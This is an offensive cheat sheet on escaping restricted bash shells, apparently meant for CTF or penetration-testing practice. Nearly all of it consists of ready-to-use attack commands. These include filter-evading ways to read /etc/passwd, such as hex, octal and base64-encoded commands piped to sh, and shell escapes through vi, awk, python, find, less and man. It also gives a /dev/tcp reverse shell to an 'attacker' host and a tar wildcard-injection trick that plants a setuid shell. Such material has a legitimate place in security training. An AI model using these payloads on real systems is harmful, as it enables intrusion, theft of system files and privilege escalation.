# Bash Jail Escapes

## Recon
```bash
echo $0                    # shell type (bash/sh/rbash)
echo $PATH                 # path restrictions
compgen -c                 # available commands
printf '%s\n' /bin/* /usr/bin/*  # list binaries
```

## Command Name Bypass
| Method | Example |
|---|---|
| Glob | `/bin/c?t /etc/passwd` |
| Quote insertion | `c''at`, `c\at` |
| Variable concat | `a=c;b=at;$a$b /etc/passwd` |
| Hex escape | `$'\x63\x61\x74' /etc/passwd` |
| Octal | `$'\143\141\164' /etc/passwd` |
| Base64 pipe | `echo Y2F0IC9ldGMvcGFzc3dk\|base64 -d\|sh` |

## Space Bypass
`${IFS}` | `{cat,/etc/passwd}` | `$'\t'` | `cat</etc/passwd`

## Slash Bypass
`${HOME:0:1}` | `${PATH:0:1}` | `${PWD:0:1}` — all yield `/`.

## Read File Without `cat`
```bash
while read l;do echo "$l";done < /etc/passwd
tac f|tac   # rev f|rev   # paste f   # head f   # tail f   # sort f
grep '' f   # sed '' f   # awk '{print}' f   # dd if=f   # base64 f   # xxd f
```

## rbash Escape
```bash
vi -c ':!/bin/sh'
awk 'BEGIN{system("/bin/sh")}'
python3 -c 'import os;os.system("/bin/sh")'
find / -exec /bin/sh \;
less /etc/passwd       # then: !/bin/sh
man man                # then: !/bin/sh
```

## FD Tricks
```bash
exec 3<>/dev/tcp/attacker/port; /bin/sh <&3 >&3 2>&3  # reverse shell via fd
```

## Wildcard Injection
```bash
# If a script runs: tar cf archive.tar *
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh privesc.sh"
echo 'cp /bin/sh /tmp/sh;chmod +s /tmp/sh' > privesc.sh
```

## Short Command Limit
`sh<<<id` | Write file-name characters with `>`, then `sh *`.
